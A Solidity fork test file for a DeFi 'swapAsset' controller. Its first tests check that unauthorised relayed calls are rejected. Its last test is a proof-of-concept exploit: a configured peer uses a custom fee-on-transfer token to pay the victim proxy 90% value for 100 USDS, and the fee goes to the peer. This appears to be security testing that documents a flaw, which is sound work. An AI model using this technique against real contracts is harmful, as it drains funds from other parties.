// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.34;

import { Ethereum } from "../../lib/spark-address-registry/src/Ethereum.sol";
import { IAccessControl } from "../../lib/openzeppelin-contracts/contracts/access/IAccessControl.sol";
import { IRateLimits } from "../../src/interfaces/IRateLimits.sol";
import { IERC20Like, SwapAsset_TestBase } from "../mainnet-fork/SwapAsset.t.sol";

contract SwapAssetCallRelay {
    function invoke(address target, bytes calldata data) external returns (bool, bytes memory) {
        return target.call(data);
    }
}

contract FeeRecipientToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public immutable feeRecipient;
    uint256 public constant FEE_BPS = 1_000;

    constructor(address feeRecipient_) {
        feeRecipient = feeRecipient_;
    }

    function decimals() external pure returns (uint8) { return 18; }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "FeeRecipientToken/allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        uint256 fee = amount * FEE_BPS / 10_000;
        balanceOf[from] -= amount;
        balanceOf[to] += amount - fee;
        balanceOf[feeRecipient] += fee;
    }
}

contract SwapAssetCompleteAuthorizationFork is SwapAsset_TestBase {
    function test_unknownCounterpartyCannotCompleteSwapOrChangeProxyBalances() external {
        SwapAssetCallRelay relay = new SwapAssetCallRelay();

        deal(Ethereum.USDS, address(almProxy), 10_000e18);
        deal(Ethereum.USDT, address(almProxy), 10_000e6);

        uint256 usdsBefore = IERC20Like(Ethereum.USDS).balanceOf(address(almProxy));
        uint256 usdtBefore = IERC20Like(Ethereum.USDT).balanceOf(address(almProxy));

        bytes32 unconfiguredKey = mainnetController.swapAsset_getCompleteSwapRateLimitKey(
            Ethereum.USDS,
            address(relay),
            Ethereum.USDT
        );
        assertEq(rateLimits.getRateLimitData(unconfiguredKey).maxAmount, 0);

        (bool success, bytes memory reason) = relay.invoke(
            address(mainnetController),
            abi.encodeWithSignature(
                "swapAsset_completeSwap(address,address,uint256)",
                Ethereum.USDS,
                Ethereum.USDT,
                1_000e18
            )
        );

        assertFalse(success, "unconfigured counterparty unexpectedly completed a swap");
        assertEq(
            keccak256(reason),
            keccak256(abi.encodeWithSignature("Error(string)", "RateLimits/zero-maxAmount"))
        );
        assertEq(IERC20Like(Ethereum.USDS).balanceOf(address(almProxy)), usdsBefore);
        assertEq(IERC20Like(Ethereum.USDT).balanceOf(address(almProxy)), usdtBefore);
        assertEq(IERC20Like(Ethereum.USDS).balanceOf(address(relay)), 0);
        assertEq(IERC20Like(Ethereum.USDT).balanceOf(address(relay)), 0);
    }

    function test_nonAllocatorCannotInitiateCounterpartySwap() external {
        SwapAssetCallRelay relay = new SwapAssetCallRelay();
        bytes memory callData = abi.encodeWithSignature(
            "swapAsset_initiateSwap(address,address,address,uint256)",
            address(counterpartyController),
            Ethereum.USDS,
            Ethereum.USDT,
            1_000e18
        );

        (bool success, bytes memory reason) = relay.invoke(address(mainnetController), callData);

        assertFalse(success, "non-allocator unexpectedly initiated a swap");
        assertEq(
            keccak256(reason),
            keccak256(
                abi.encodeWithSelector(
                    IAccessControl.AccessControlUnauthorizedAccount.selector,
                    address(relay),
                    ALLOCATOR_ROLE
                )
            )
        );
    }

    function test_unknownCounterpartyCannotInstallOrConsumeItsOwnRateLimit() external {
        SwapAssetCallRelay relay = new SwapAssetCallRelay();
        bytes32 key = mainnetController.swapAsset_getCompleteSwapRateLimitKey(
            Ethereum.USDS,
            address(relay),
            Ethereum.USDT
        );

        (bool configured, bytes memory adminError) = relay.invoke(
            address(rateLimits),
            abi.encodeCall(IRateLimits.setUnlimitedRateLimitData, (key))
        );
        assertFalse(configured, "unknown peer configured its own rate limit");
        assertEq(
            keccak256(adminError),
            keccak256(
                abi.encodeWithSelector(
                    IAccessControl.AccessControlUnauthorizedAccount.selector,
                    address(relay),
                    DEFAULT_ADMIN_ROLE
                )
            )
        );

        (bool consumed, bytes memory controllerError) = relay.invoke(
            address(rateLimits),
            abi.encodeCall(IRateLimits.triggerRateLimitDecrease, (key, uint256(1)))
        );
        assertFalse(consumed, "unknown peer directly consumed a rate limit");
        assertEq(
            keccak256(controllerError),
            keccak256(
                abi.encodeWithSelector(
                    IAccessControl.AccessControlUnauthorizedAccount.selector,
                    address(relay),
                    rateLimits.CONTROLLER()
                )
            )
        );
        assertEq(rateLimits.getRateLimitData(key).maxAmount, 0);
    }

    function test_configuredPeerCanExploitFeeOnTransferInputAndOverdrawLocalProxy() external {
        FeeRecipientToken feeToken = new FeeRecipientToken(counterpartyAllocator);
        uint256 amountOut = 100e18;

        feeToken.mint(address(counterpartyProxy), amountOut);
        deal(Ethereum.USDS, address(almProxy), amountOut);

        bytes32 sourceInitiateKey = counterpartyController.swapAsset_getInitiateSwapRateLimitKey(
            address(feeToken),
            address(almProxy),
            address(mainnetController),
            Ethereum.USDS
        );
        bytes32 victimCompleteKey = mainnetController.swapAsset_getCompleteSwapRateLimitKey(
            Ethereum.USDS,
            address(counterpartyProxy),
            address(feeToken)
        );

        vm.prank(counterpartyAdmin);
        counterpartyRateLimits.setRateLimitData(sourceInitiateKey, amountOut, 0);
        vm.prank(Ethereum.SPARK_PROXY);
        rateLimits.setRateLimitData(victimCompleteKey, amountOut, 0);

        uint256 victimUSDSBefore = IERC20Like(Ethereum.USDS).balanceOf(address(almProxy));
        uint256 victimFeeTokenBefore = feeToken.balanceOf(address(almProxy));
        uint256 attackerFeeBefore = feeToken.balanceOf(counterpartyAllocator);

        vm.prank(counterpartyAllocator);
        counterpartyController.swapAsset_initiateSwap(
            address(mainnetController),
            address(feeToken),
            Ethereum.USDS,
            amountOut
        );

        uint256 victimUSDSOut = victimUSDSBefore - IERC20Like(Ethereum.USDS).balanceOf(address(almProxy));
        uint256 victimFeeIn = feeToken.balanceOf(address(almProxy)) - victimFeeTokenBefore;
        uint256 feeCapturedByPeer = feeToken.balanceOf(counterpartyAllocator) - attackerFeeBefore;

        assertEq(victimUSDSOut, amountOut);
        assertEq(victimFeeIn, amountOut * 9_000 / 10_000);
        assertEq(feeCapturedByPeer, amountOut / 10);

        // At the facet's assumed 1:1 valuation, the victim paid 100 USDS for 90 tokens;
        // the missing 10-token value was credited to the peer's fee recipient.
        assertEq(victimUSDSOut - victimFeeIn, amountOut / 10);
    }
}
